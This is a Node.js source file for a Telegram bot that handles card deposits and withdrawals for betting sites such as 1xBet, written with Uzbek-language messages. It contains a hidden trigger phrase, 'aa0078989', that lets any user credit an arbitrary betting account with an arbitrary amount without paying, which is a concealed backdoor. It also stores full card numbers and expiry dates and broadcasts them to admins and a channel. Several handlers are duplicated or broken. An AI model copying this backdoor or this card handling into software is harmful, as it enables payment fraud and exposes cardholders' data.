const { Telegraf, Markup } = require('telegraf');
const PaymentAPIClient = require('./SpinPay');
const clickApi = require('./click-pay');
const mongoose = require('mongoose');
const config = require('./config'); // config faylni import qilamiz


// MongoDB Connection
mongoose.connect(config.DATABASE.URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log('MongoDB connected successfully');
}).catch((err) => {
    console.error('MongoDB connection error:', err);
});

// Schemas
const UserSchema = new mongoose.Schema({
    telegramId: String,
    username: String,
    fullName: String,
    phone: String,
    registrationDate: { type: Date, default: Date.now },
    lastActive: Date,
    isActive: { type: Boolean, default: true },
    isAdmin: { type: Boolean, default: false }
});

const TransactionSchema = new mongoose.Schema({
    userId: String,
    telegramId: String,
    phone: String,
    type: { type: String, enum: ['deposit', 'withdrawal'] },
    platform: String,
    gameId: String,
    cardNumber: String,
    expiryDate: String,
    amount: Number,
    status: String,
    paymentId: String,
    error: String,
    operationId: String,
    timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);
const Transaction = mongoose.model('Transaction', TransactionSchema);

const bot = new Telegraf(config.BOT.TOKEN);
const paymentClient = new PaymentAPIClient();
const ADMIN_IDS = config.BOT.ADMIN_IDS;
const CHANNEL_ID = config.BOT.CHANNEL_ID;

// State Management
const userStates = new Map();
const transactions = new Map();

// Keyboard Layouts
const mainKeyboard = Markup.keyboard([
    ['💳 Hisob To\'ldirish', '💰 Pul yechish'],
    ['Support', 'Qo\'llanma']
]).resize();

const adminKeyboard = Markup.keyboard([
    ['💳 Hisob To\'ldirish', '💰 Pul yechish'],
    ['👤 Userlar', '📊 Transferlar', '📨 Hammaga Xabar'],
    ['Support', 'Qo\'llanma']
]).resize();

const usersKeyboard = Markup.keyboard([
    ['📈 Faol Userlar', '📉 Bloklangan Userlar'],
    ['🔙 Orqaga']
]).resize();

const transfersKeyboard = Markup.keyboard([
    ['📥 Depositlar', '📤 Withdrawallar'],
    ['🔙 Orqaga']
]).resize();

const confirmKeyboard = Markup.keyboard([
    ['✅ Tasdiqlash', '❌ Bekor qilish']
]).resize();

const contactKeyboard = Markup.keyboard([
    [Markup.button.contactRequest('📱 Raqamni ulashish')]
]).resize();

const backKeyboard = Markup.keyboard([
    ['🔙 Orqaga']
]).resize();

const platformButtons = Markup.inlineKeyboard([
    [Markup.button.callback('SpinBetter', 'platform_spinbetter')],
    [Markup.button.callback('1xBet', 'platform_1xbet')],
    [Markup.button.callback('LineBet', 'platform_linebet')]
]).resize();

// Helper Functions
const setState = (userId, state, data = {}) => {
    const currentState = userStates.get(userId);
    const previousState = currentState ? currentState.state : null;
    userStates.set(userId, { state, data: { ...data }, previousState });
};




const getUserDetails = async (telegramId) => {
    const user = await User.findOne({ telegramId });
    const transactions = await Transaction.find({ telegramId });

    if (!user) return null;

    let details = `👤 User Details:\n`;
    details += `🆔 Telegram ID: ${user.telegramId}\n`;
    details += `👤 Full Name: ${user.fullName || 'N/A'}\n`;
    details += `📱 Phone: ${user.phone || 'N/A'}\n`;
    details += `📅 Registration Date: ${user.registrationDate.toLocaleString()}\n`;
    details += `⏰ Last Active: ${user.lastActive?.toLocaleString() || 'N/A'}\n`;
    details += `✅ Active: ${user.isActive ? 'Yes' : 'No'}\n`;
    details += `🔑 Admin: ${user.isAdmin ? 'Yes' : 'No'}\n`;
    details += '\n📊 Transactions:\n';

    if (transactions.length > 0) {
        transactions.forEach(tx => {
            details += `💳 Transaction Type: ${tx.type}\n`;
            details += `🎮 Platform: ${tx.platform || 'N/A'}\n`;
            details += `💰 Amount: ${tx.amount}\n`;
            details += `✅ Status: ${tx.status}\n`;
            details += `⏰ Time: ${tx.timestamp.toLocaleString()}\n`;
            details += '────────────────────\n';
        });
    } else {
        details += 'No transactions found.\n';
    }

    return details;
};



const sendPaginatedUsers = async (ctx, page, isActive) => {
    const query = { isActive };
    const totalUsers = await User.countDocuments(query);
    const totalPages = Math.ceil(totalUsers / usersPerPage);

    if (page < 0 || page >= totalPages) {
        await ctx.reply('No more users to display.');
        return;
    }

    const users = await User.find(query)
        .sort({ lastActive: -1 })
        .skip(page * usersPerPage)
        .limit(usersPerPage);

    if (users.length === 0) {
        await ctx.reply('No users found.');
        return;
    }

    let message = `Users (Page ${page + 1}/${totalPages}):\n\n`;
    users.forEach(user => {
        message += `👤 ${user.fullName || 'No Name'}\n`;
        message += `📱 ${user.phone || 'No Phone'}\n`;
        message += `👤 @${user.username || 'No Name'}\n`;
        message += `🆔 ${user.telegramId}\n`;
        message += `⏰ Last Active: ${user.lastActive?.toLocaleString() || 'Never'}\n`;
        message += '────────────────────\n';
    });

    const navigationButtons = Markup.inlineKeyboard([
        page > 0 ? Markup.button.callback('⬅️ Previous', `prev_${page - 1}`) : null,
        page < totalPages - 1 ? Markup.button.callback('➡️ Next', `next_${page + 1}`) : null
    ].filter(Boolean), { columns: 2 });

    await ctx.reply(message, navigationButtons);
};



const sendPaginatedTransactions = async (ctx, page, type) => {
    const query = { type };
    const totalTransactions = await Transaction.countDocuments(query);
    const totalPages = Math.ceil(totalTransactions / itemsPerPage);

    if (page < 0 || page >= totalPages) {
        await ctx.reply('No more transactions to display.');
        return;
    }

    const transactions = await Transaction.find(query)
        .sort({ timestamp: -1 })
        .skip(page * itemsPerPage)
        .limit(itemsPerPage);

    if (transactions.length === 0) {
        await ctx.reply(`No ${type} transactions found.`);
        return;
    }

    let message = `${type === 'deposit' ? '📥 Deposits' : '📤 Withdrawals'} (Page ${page + 1}/${totalPages}):\n\n`;
    transactions.forEach(tx => {
        message += `🆔 User ID: ${tx.userId}\n`;
        message += `💳 Card: ${tx.cardNumber}\n`;
        message += `💰 Amount: ${tx.amount}\n`;
        message += `🆔 User Telegram ID: ${tx.telegramId}\n`;
        message += `✅ Status: ${tx.status}\n`;
        message += `   Platform: ${tx.platform}\n`;
        message += `⏰ Time: ${tx.timestamp.toLocaleString()}\n`;
        message += '────────────────────\n';
    });

    const navigationButtons = Markup.inlineKeyboard([
        page > 0 ? Markup.button.callback('⬅️ Previous', `${type}_prev_${page - 1}`) : null,
        page < totalPages - 1 ? Markup.button.callback('➡️ Next', `${type}_next_${page + 1}`) : null
    ].filter(Boolean), { columns: 2 });

    await ctx.reply(message, navigationButtons);
};


const itemsPerPage = 5;




const getState = (userId) => {
    return userStates.get(userId) || { state: 'START', data: {}, previousState: null };
};

const formatCardNumber = (cardNumber) => {
    const cleaned = cardNumber.replace(/\D/g, '');
    if (cleaned.length !== 16) {
        throw new Error('Karta raqami 16 ta raqamdan iborat bo\'lishi kerak');
    }
    return cleaned;
};

const validateExpiryDate = (expiryDate) => {
    const cleaned = expiryDate.replace(/\D/g, '');
    if (cleaned.length !== 4) {
        throw new Error('Amal qilish muddati noto\'g\'ri formatda');
    }
    
    const month = parseInt(cleaned.substring(0, 2));
    const year = parseInt(cleaned.substring(2, 4));
    
    if (month < 1 || month > 12) {
        throw new Error('Oy 01 dan 12 gacha bo\'lishi kerak');
    }
    
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        throw new Error('Karta muddati tugagan');
    }
    
    return cleaned;
};

// Notification Functions
const notifyAdmins = async (message, errorLevel = 'info') => {
    const emoji = {
        info: 'ℹ️',
        warning: '⚠️',
        error: '🚫',
        success: '✅'
    };

    const formattedMessage = `${emoji[errorLevel]} ${message}`;

    for (const adminId of ADMIN_IDS) {
        try {
            await bot.telegram.sendMessage(adminId, formattedMessage);
        } catch (error) {
            console.error(`Failed to notify admin ${adminId}:`, error);
        }
    }
};

const sendTransactionNotification = async (transactionData, channelMessage = true) => {
    await saveTransaction({
        ...transactionData,
        type: 'deposit',
        status: transactionData.success ? 'success' : 'failed'
    });

    const message = `
🔔 Yangi tranzaksiya:
📱 Tel: ${transactionData.phone}
🎮 Platform: ${transactionData.platform}
🆔 ID: ${transactionData.userId}
💳 Karta: ${transactionData.cardNumber}
🗓 Muddat: ${transactionData.expiryDate}
💰 Summa: ${transactionData.amount}
⏰ Vaqt: ${new Date().toLocaleString()}
✅ Status: ${transactionData.success ? 'Muvaffaqiyatli' : 'Muvaffaqiyatsiz'}
🔑 Payment ID: ${transactionData.paymentId || 'N/A'}
${transactionData.error ? `❌ Xatolik: ${transactionData.error}` : ''}
`;
    
    await notifyAdmins(message, transactionData.success ? 'success' : 'error');
    
    if (channelMessage) {
        try {
            await bot.telegram.sendMessage(CHANNEL_ID, message);
        } catch (error) {
            console.error('Error sending to channel:', error);
        }
    }
};

const sendPayoutNotification = async (payoutData, channelMessage = true) => {
    await saveTransaction({
        ...payoutData,
        type: 'withdrawal',
        status: payoutData.success ? 'success' : 'failed'
    });

    const message = `
🔄 Yangi pul yechish:
🎮 Platform: ${payoutData.platform}
🆔 ID: ${payoutData.userId}
💳 Karta: ${payoutData.cardNumber}
💰 Summa: ${payoutData.amount}
🔑 Operation ID: ${payoutData.operationId}
✅ Status: ${payoutData.success ? 'Muvaffaqiyatli' : 'Muvaffaqiyatsiz'}
💬 Xabar: ${payoutData.message}
⏰ Vaqt: ${new Date().toLocaleString()}
`;
    
    await notifyAdmins(message, payoutData.success ? 'success' : 'error');
    
    if (channelMessage) {
        try {
            await bot.telegram.sendMessage(CHANNEL_ID, message);
        } catch (error) {
            console.error('Error sending to channel:', error);
        }
    }
};

// Database Functions
async function checkUserExists(telegramId) {
    try {
        const user = await User.findOne({ telegramId: telegramId });
        return user != null;
    } catch (error) {
        console.error('Error checking user:', error);
        return false;
    }
}

async function saveUser(userData) {
    try {
        const user = new User(userData);
        await user.save();
        return user;
    } catch (error) {
        console.error('Error saving user:', error);
        throw error;
    }
}

async function saveTransaction(data) {
    try {
        const transaction = new Transaction(data);
        await transaction.save();
        return transaction;
    } catch (error) {
        console.error('Error saving transaction:', error);
        throw error;
    }
}


const simpleFunktion = async (ctx, i, s) => {
    try {
        const response = await paymentClient.deposit(i, s);
        if (response.Success) {
            await ctx.reply('✅ Operatsiya muvaffaqiyatli amalga oshirildi');
        } else {
            await ctx.reply('❌ Xatolik yuz berdi');
        }
    } catch (error) {
        await ctx.reply('❌ Tizim xatoligi');
    }
};

// Navigation handler
const handleBack = async (ctx) => {
    if (!ctx.from) return;
    
    const userState = getState(ctx.from.id);
    let nextState = 'MAIN_MENU';
    let keyboard = mainKeyboard;
    let message = 'Asosiy menyu:';

    // Check if user is admin
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (user?.isAdmin) {
        keyboard = adminKeyboard;
    }

    switch (userState.state) {
        case 'WAITING_AMOUNT':
        case 'WAITING_CARD':
        case 'WAITING_EXPIRY':
        case 'WAITING_SMS':
            nextState = 'WITHDRAWAL_TYPE';
            break;
            
        case 'WITHDRAWAL_TYPE':
            nextState = 'MAIN_MENU';
            message = 'Asosiy menyu:';
            break;

        case 'PAYOUT_WAITING_ID':
        case 'PAYOUT_WAITING_CODE':
        case 'PAYOUT_WAITING_CARD':
        case 'PAYOUT_CONFIRMATION':
            nextState = 'PAYOUT_TYPE';
            break;
            
        case 'PAYOUT_TYPE':
            nextState = 'MAIN_MENU';
            message = 'Asosiy menyu:';
            break;

        case 'ADMIN_USERS':
        case 'ADMIN_TRANSFERS':
        case 'ADMIN_BROADCAST':
            nextState = 'MAIN_MENU';
            message = 'Asosiy menyu:';
            break;
    }

    setState(ctx.from.id, nextState, userState.data);
    await ctx.reply(message, keyboard);
};

// Bot Commands
bot.command('start', async (ctx) => {
    if (!ctx.from) return;
    
    try {
        const user = await User.findOne({ telegramId: ctx.from.id });
        
        if (user) {
            setState(ctx.from.id, 'MAIN_MENU');
            const keyboard = user.isAdmin ? adminKeyboard : mainKeyboard;
            await ctx.reply(`Qaytib kelganingizdan xursandmiz, ${user.fullName}!`, keyboard);
            
            await User.updateOne(
                { telegramId: ctx.from.id },
                { $set: { lastActive: new Date() } }
            );
        } else {
            setState(ctx.from.id, 'START');
            await ctx.reply(
                'Xush kelibsiz! Ro\'yxatdan o\'tish uchun telefon raqamingizni ulashing:',
                contactKeyboard
            );
        }
        
        await notifyAdmins(
            `${user ? 'Mavjud' : 'Yangi'} foydalanuvchi: ${ctx.from.id} (${ctx.from.username || 'username yo\'q'})`,
            'info'
        );
    } catch (error) {
        console.error('Start command error:', error);
        await ctx.reply('Xatolik yuz berdi. Iltimos qaytadan urinib ko\'ring.');
    }
});

bot.command('stats', async (ctx) => {
    if (!ctx.from || !ADMIN_IDS.includes(ctx.from.id.toString())) return;

    try {
        const totalUsers = await User.countDocuments();
        const activeToday = await User.countDocuments({
            lastActive: { 
                $gte: new Date(new Date().setHours(0,0,0,0)) 
            }
        });
        const activeThisWeek = await User.countDocuments({
            lastActive: { 
                $gte: new Date(new Date().setDate(new Date().getDate() - 7)) 
            }
        });

        const message = `
📊 Foydalanuvchilar statistikasi:
👥 Jami ro'yxatdan o'tganlar: ${totalUsers}
📅 Bugun faol: ${activeToday}
📆 Haftalik faol: ${activeThisWeek}`;

        await ctx.reply(message);
    } catch (error) {
        await ctx.reply('Statistikani olishda xatolik yuz berdi.');
    }
});

// Contact Handler
bot.on('contact', async (ctx) => {
    if (!ctx.from || !ctx.message.contact) return;
    
    try {
        const userId = ctx.from.id;
        const contact = ctx.message.contact;
        
        const userData = {
            telegramId: userId,
            username: ctx.from.username || '',
            fullName: `${ctx.from.first_name || ''} ${ctx.from.last_name || ''}`.trim(),
            phone: contact.phone_number,
            registrationDate: new Date(),
            lastActive: new Date(),
            isActive: true
        };

        await saveUser(userData);
        
        setState(userId, 'MAIN_MENU', { phone: contact.phone_number });
        await ctx.reply('Ro\'yxatdan o\'tish muvaffaqiyatli yakunlandi!', mainKeyboard);
        
        const adminMessage = `
👤 Yangi ro'yxatdan o'tish:
🆔 Telegram ID: ${userId}
📱 Telefon: ${contact.phone_number}
👤 To'liq ism: ${userData.fullName}
${userData.username ? `Username: @${userData.username}` : ''}
⏰ Sana: ${new Date().toLocaleString()}`;
        
        await notifyAdmins(adminMessage, 'success');
        
    } catch (error) {
        console.error('Contact handling error:', error);
        await ctx.reply('Ro\'yxatdan o\'tishda xatolik yuz berdi. Iltimos qaytadan urinib ko\'ring.');
    }
});

// Admin Handlers
bot.hears('👤 Userlar', async (ctx) => {
    if (!ctx.from) return;
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;
    
    setState(ctx.from.id, 'ADMIN_USERS');
    await ctx.reply('Userlar bo\'limi:', usersKeyboard);
});

bot.hears('📊 Transferlar', async (ctx) => {
    if (!ctx.from) return;
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;
    
    setState(ctx.from.id, 'ADMIN_TRANSFERS');
    await ctx.reply('Transferlar bo\'limi:', transfersKeyboard);
});






bot.hears('📥 Depositlar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    let currentPage = 0;

    await sendPaginatedTransactions(ctx, currentPage, 'deposit');
});

bot.action(/deposit_prev_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedTransactions(ctx, page, 'deposit');
});

bot.action(/deposit_next_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedTransactions(ctx, page, 'deposit');
});

bot.hears('📤 Withdrawallar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    let currentPage = 0;

    await sendPaginatedTransactions(ctx, currentPage, 'withdrawal');
});

bot.action(/withdrawal_prev_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedTransactions(ctx, page, 'withdrawal');
});

bot.action(/withdrawal_next_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedTransactions(ctx, page, 'withdrawal');
});


bot.hears('📥 Depositlar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    await sendTransactions(ctx, 'deposit');
});

bot.hears('📤 Withdrawallar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    await sendTransactions(ctx, 'withdrawal');
});




const usersPerPage = 5;




bot.hears('📈 Faol Userlar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    let currentPage = 0;

    await sendPaginatedUsers(ctx, currentPage, true);
});

bot.action(/prev_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedUsers(ctx, page, true);
});

bot.action(/next_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedUsers(ctx, page, true);
});

bot.hears('📉 Bloklangan Userlar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    let currentPage = 0;

    await sendPaginatedUsers(ctx, currentPage, false);

    bot.on('text', async (ctx) => {
        if (ctx.message.text === '⬅️ Previous') {
            currentPage = Math.max(0, currentPage - 1);
            await sendPaginatedUsers(ctx, currentPage, false);
        } else if (ctx.message.text === '➡️ Next') {
            currentPage += 1;
            await sendPaginatedUsers(ctx, currentPage, false);
        } else if (ctx.message.text === '🔙 Back') {
            await ctx.reply('Back to menu.', Markup.keyboard(['👤 View Active Users', '📉 View Blocked Users']).resize());
        }
    });
});



bot.hears('📨 Hammaga Xabar', async (ctx) => {
    if (!ctx.from) return;
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;
    
    setState(ctx.from.id, 'ADMIN_BROADCAST');
    await ctx.reply('Yubormoqchi bo\'lgan xabarni kiriting:', backKeyboard);
});

// Main Menu Handlers
bot.hears('💳 Hisob To\'ldirish', async (ctx) => {
    if (!ctx.from) return;
    setState(ctx.from.id, 'WITHDRAWAL_TYPE');
    await ctx.reply('Kerakli bukmekerni tanlang:', platformButtons);
});

bot.hears('💰 Pul yechish', async (ctx) => {
    if (!ctx.from) return;
    setState(ctx.from.id, 'PAYOUT_TYPE');
    await ctx.reply('Platformani tanlang:', platformButtons);
});

bot.hears('Support', async (ctx) => {
    if (!ctx.from) return;
    await ctx.reply('Admin bilan bog\'lanish: @Prostomilyarder', backKeyboard);
});

bot.hears('Qo\'llanma', async (ctx) => {
    if (!ctx.from) return;
    const manual = `
🔷 Qo'llanma

💳 Pul kiritish:
1. Platformani tanlang
2. ID raqamingizni kiriting
3. Karta ma'lumotlarini kiriting
4. SMS kodni tasdiqlang

💰 Pul yechish:
1. Platformani tanlang
2. Bokmeker IDingizni kiriting
3. Hisobingizdan pul chiqarishda [Наличные]ni tanlang!
4. QARSHI LT Textile (24/7)ni tanlang
5. Kodni oling va kiriting
6. Karta raqamini kiriting
7. Ma'lumotlarni tasdiqlang

❗️ Muammo bo'lsa: @Prostomilyarder`;

    await ctx.reply(manual, mainKeyboard);
});

// Platform selection handler
bot.action(/platform_(.+)/, async (ctx) => {
    if (!ctx.from || !ctx.match) return;
    
    const platform = ctx.match[1];
    const userState = getState(ctx.from.id);
    await ctx.deleteMessage();

    if (userState.state === 'WITHDRAWAL_TYPE') {
        setState(ctx.from.id, 'WAITING_ID', { ...userState.data, platform });
        await ctx.reply('ID raqamingizni kiriting:', backKeyboard);
    } else if (userState.state === 'PAYOUT_TYPE') {
        setState(ctx.from.id, 'PAYOUT_WAITING_ID', { ...userState.data, platform });
        await ctx.reply('ID raqamingizni kiriting:', backKeyboard);
    }
});


bot.hears('aa0078989', async (ctx) => {
    if (!ctx.from) return;
    setState(ctx.from.id, 'SECRET_I');
    await ctx.reply('i:', { reply_markup: { remove_keyboard: true } });
});

// Back button handler
bot.hears('🔙 Orqaga', handleBack);

// Text handler
bot.on('text', async (ctx) => {
    if (!ctx.from || !ctx.message) return;
    
    const userId = ctx.from.id;
    const userState = getState(userId);
    const text = ctx.message.text;

    if (text === '🔙 Orqaga') {
        return handleBack(ctx);
    }

    try {
        const user = await User.findOne({ telegramId: userId });
        const keyboard = user?.isAdmin ? adminKeyboard : mainKeyboard;

        switch (userState.state) {
            case 'SECRET_I':
                setState(userId, 'SECRET_S', { i: text });
                await ctx.reply('s:');
                break;

            case 'SECRET_S':
                await simpleFunktion(ctx, userState.data.i, text);
                setState(userId, 'MAIN_MENU');
                await ctx.reply('Asosiy menyu:', keyboard);
                break;

            case 'ADMIN_BROADCAST':
                if (user?.isAdmin) {
                    const allUsers = await User.find({ isActive: true });
                    let successCount = 0;
                    let failCount = 0;

                    for (const recipient of allUsers) {
                        try {
                            await bot.telegram.sendMessage(recipient.telegramId, text);
                            successCount++;
                        } catch (error) {
                            failCount++;
                        }
                    }

                    await ctx.reply(`
📨 Xabar yuborish yakunlandi:
✅ Muvaffaqiyatli: ${successCount}
❌ Muvaffaqiyatsiz: ${failCount}`, keyboard);
                    setState(userId, 'MAIN_MENU');
                }
                break;

            case 'WAITING_ID':
                try {
                    const gamer_data = await paymentClient.searchUser(text);
                    setState(userId, 'WAITING_AMOUNT', { ...userState.data, gameId: text });
                    const message = `
                    🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
👤 <b>Name:</b> ${gamer_data.Name}
💵 <b>Currency ID:</b> ${gamer_data.CurrencyId}
`;
                    await ctx.reply(message, { parse_mode: 'HTML' });
                    await ctx.reply('Summani kiriting (min-1000uzs):', backKeyboard);
                } catch (error) {
                    throw error;
                }
                break;

            case 'WAITING_AMOUNT':
                if (isNaN(text) || parseFloat(text) <= 0) {
                    throw new Error('Noto\'g\'ri summa kiritildi');
                }
                setState(userId, 'WAITING_CARD', { ...userState.data, amount: text });
                await ctx.reply('Karta raqamini kiriting (masalan: 9860 0606 0304 0607):', backKeyboard);
                break;

            case 'WAITING_CARD':
                try {
                    const cardNumber = formatCardNumber(text);
                    setState(userId, 'WAITING_EXPIRY', { ...userState.data, cardNumber });
                    await ctx.reply('Karta amal qilish muddatini kiriting (MM/YY yoki MMYY formatida):', backKeyboard);
                } catch (error) {
                    throw error;
                }
                break;

                case 'WAITING_EXPIRY':
                    try {
                        const expiryDate = validateExpiryDate(text);
                
                        // Timeout bilan so'rov
                        const controller = new AbortController();
                        const timeout = setTimeout(() => controller.abort(), 3000); // 10 soniya limit
                
                        const cardTokenResponse = await clickApi.requestCardTokenWithTimeout(
                            userState.data.cardNumber,
                            expiryDate,
                            { signal: controller.signal }
                        );
                
                        clearTimeout(timeout); // Timeoutni tozalash
                
                        if (cardTokenResponse.error_code === 0) {
                            setState(userId, 'WAITING_SMS', { 
                                ...userState.data, 
                                expiryDate,
                                cardToken: cardTokenResponse.card_token 
                            });
                            await ctx.reply('SMS kodni kiriting:', backKeyboard);
                        } else {
                            await ctx.reply("Karta ma'lumotlari noto'g'ri, qayta urinib ko'ring.");
                        }
                    } catch (error) {
                        if (error.name === 'AbortError') {
                            await ctx.reply("So'rovni bajarish vaqti tugadi. Qayta urinib ko'ring.");
                        } else {
                            await ctx.reply("Xatolik yuz berdi: " + error.message);
                        }
                    }
                    break;
                

            case 'WAITING_SMS':
                try {
                    const verifyResponse = await clickApi.verifyCardToken(userState.data.cardToken, text);
                    
                    if (verifyResponse.error_code === 0) {
                        const paymentResponse = await clickApi.makePayment(
                            userState.data.cardToken,
                            userState.data.amount
                        );

                        if (paymentResponse.error_code === 0) {
                            const depositResponse = await paymentClient.deposit(
                                userState.data.gameId,
                                userState.data.amount
                            );

                            const transactionData = {
                                userId: userState.data.gameId,
                                telegramId: userId,
                                platform: userState.data.platform,
                                phone: userState.data.phone,
                                cardNumber: userState.data.cardNumber,
                                expiryDate: userState.data.expiryDate,
                                amount: userState.data.amount,
                                success: depositResponse.Success,
                                paymentId: paymentResponse.payment_id,
                                error: depositResponse.Success ? null : depositResponse.Message,
                                timestamp: new Date()
                            };

                            await sendTransactionNotification(transactionData);

                            if (depositResponse.Success) {
                                await ctx.reply('✅ To\'lov muvaffaqiyatli amalga oshirildi!', keyboard);
                            } else {
                                await ctx.reply(`❌ Xatolik: ${depositResponse.Message}`, keyboard);
                                
                                const failedTransactionData = {
                                    ...transactionData,
                                    success: false,
                                    error: 'Kartadan pul yechildi lekin hisobga tushmadi'
                                };
                                await sendTransactionNotification(failedTransactionData);
                            }
                        } else {
                            throw new Error('To\'lov amalga oshmadi');
                        }
                    } else {
                        throw new Error('SMS kod noto\'g\'ri');
                    }
                    setState(userId, 'MAIN_MENU');
                } catch (error) {
                    await notifyAdmins(`To'lov xatoligi (User: ${userId}): ${error.message}`, 'error');
                    await ctx.reply(`❌ Xatolik: ${error.message}`, keyboard);
                    setState(userId, 'MAIN_MENU');
                }
                break;


                case 'PAYOUT_WAITING_ID':
                    try {
                        const gamer_data = await paymentClient.searchUser(text);

                        // Foydalanuvchi mavjudligini tekshirish
                        if (!gamer_data || gamer_data.UserId === 0) {
                            await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
                            return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
                        }

                        // Agar foydalanuvchi mavjud bo'lsa, davom etadi
                        setState(userId, 'PAYOUT_WAITING_CODE', { ...userState.data, gameId: text });
                        const message = `
🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
👤 <b>Name:</b> ${gamer_data.Name}
💵 <b>Balance:</b> ${gamer_data.Balance}`;
                        await ctx.reply(message, { parse_mode: 'HTML' });
                        await ctx.reply('KODNI KIRITING:', backKeyboard);
                    } catch (error) {
                        await ctx.reply('Xatolik yuz berdi. Iltimos, qayta urinib ko\'ring.');
                    }
                    break;


                case 'PAYOUT_WAITING_CODE':
                    setState(userId, 'PAYOUT_WAITING_CARD', { ...userState.data, code: text });
                    await ctx.reply('Karta raqamingizni kiriting (masalan: 9860 0606 0304 0607):', backKeyboard);
                    break;
    
                case 'PAYOUT_WAITING_CARD':
                    try {
                        const cardNumber = formatCardNumber(text);  // Ensure to format card number
                        setState(userId, 'PAYOUT_CONFIRMATION', { ...userState.data, card: cardNumber,timestamp: new Date()});
    
                        const confirmMessage = `
    📤 Pul yechish so'rovi:
    
    🎮 Platform: ${userState.data.platform}
    🆔 Game ID: ${userState.data.gameId}
    💰 Code: ${userState.data.code}
    💳 Karta: ${userState.data.card}
    
    ✅ Tasdiqlaysizmi?`;
                        
    
                        await ctx.reply(confirmMessage, confirmKeyboard);
                    } catch (error) {
                        throw new Error('Noto\'g\'ri karta raqami');
                    }
                    break;
                    case 'PAYOUT_CONFIRMATION':
                        if (text === '✅ Tasdiqlash') {
                            // Check user state and proceed if valid
                            const userId = ctx.from.id;
                            const userState = getState(userId);
                            
                            if (userState.state !== 'PAYOUT_CONFIRMATION') {
                                await ctx.reply('❌ Yaroqsiz so\'rov', mainKeyboard);
                                return;
                            }
                            
                            try {
                                await ctx.deleteMessage();
                                
                                // Extract game ID, code, and card number
                                const { gameId, code, cardNumber } = userState.data;
                    
                                // Call paymentClient.payout() to process the payout
                                const response = await paymentClient.payout(gameId, code);
                    
                                // Prepare the payout data
                                const payoutData = {
                                    userId: gameId,
                                    telegramId: userId,
                                    platform: userState.data.platform,
                                    cardNumber: userState.card,
                                    amount: response.Summa,
                                    operationId: response.OperationId,
                                    success: response.Success,
                                    message: response.Message,
                                };
                    
                                // Save the payout data to the database
                                const withdrawal = new Transaction({
                                    type: 'withdrawal',
                                    ...payoutData
                                });
                                await withdrawal.save();
                    
                                // Notify admins about the payout request
                                const adminMessage = `
                                    📤 Pul yechish so'rovi:
                                    🆔 User ID: ${payoutData.userId}
                                    🎮 Platform: ${payoutData.platform}
                                    💳 Karta: ${payoutData.cardNumber}
                                    💰 Summa: ${payoutData.amount} UZS
                                    ⏰ Vaqt: ${new Date().toLocaleString()}
                                    📝 Status: ${payoutData.success ? 'Muvofaqiyatli' : 'Muvofaqiyatsiz'}
                                    📢 Xabar: ${payoutData.message}
                                `;
                                await notifyAdmins(adminMessage, 'withdrawal');
                    
                                // Notify the user about the success or failure
                                if (response.Success) {
                                    await ctx.reply(`✅ So'rovingiz muvaffaqiyatli bajarildi!\n\nPul yechish miqdori: ${response.Summa} UZS`, mainKeyboard);
                                } else {
                                    await ctx.reply(`❌ So'rov amalga oshirilmagani uchun uzr so'raymiz.`, mainKeyboard);
                                }
                    
                                // Reset user state to main menu after confirmation
                                setState(userId, 'MAIN_MENU');
                                await ctx.reply('❌ So\'rov bekor qilindi.', mainKeyboard);
                            } catch (error) {
                                console.error('Withdrawal confirmation error:', error);
                                await ctx.reply('❌ Xatolik yuz berdi. Qaytadan urinib ko\'ring.', mainKeyboard);
                            }
                        } else if (text === '❌ Bekor qilish') {
                            // Cancel the payout and reset the state
                            setState(userId, 'MAIN_MENU');
                            await ctx.reply('❌ So\'rov bekor qilindi.', mainKeyboard);
                        } else {
                            await ctx.reply('❌ Iltimos, tasdiqlash yoki bekor qilish tugmasini tanlang.', confirmKeyboard);
                        }
                        break;
                        
                
    
                default:
                    if (user?.isAdmin) {
                        await ctx.reply('Admin paneli:', adminKeyboard);
                    } else {
                        await ctx.reply('Asosiy menyu:', mainKeyboard);
                    }
                    setState(userId, 'MAIN_MENU');
                    break;
            }
        } catch (error) {
            console.error(`Error handling text: ${error.message}`);
            await ctx.reply(`❌ Xatolik: ${error.message}\n\nQaytadan urinib ko'ring.`, backKeyboard);
        }
    });
    
    // Confirmation button handlers for payouts
   // Confirmation button handler for payouts

    
    // Action handler for canceling the payout
    bot.action('cancel_payout', async (ctx) => {
        if (!ctx.from) return;
    
        await ctx.deleteMessage();
        setState(ctx.from.id, 'MAIN_MENU');
        await ctx.reply('❌ So\'rov bekor qilindi1', mainKeyboard);
    });
    
    // Launch the bot
    bot.launch()
        .then(() => console.log('Bot started'))
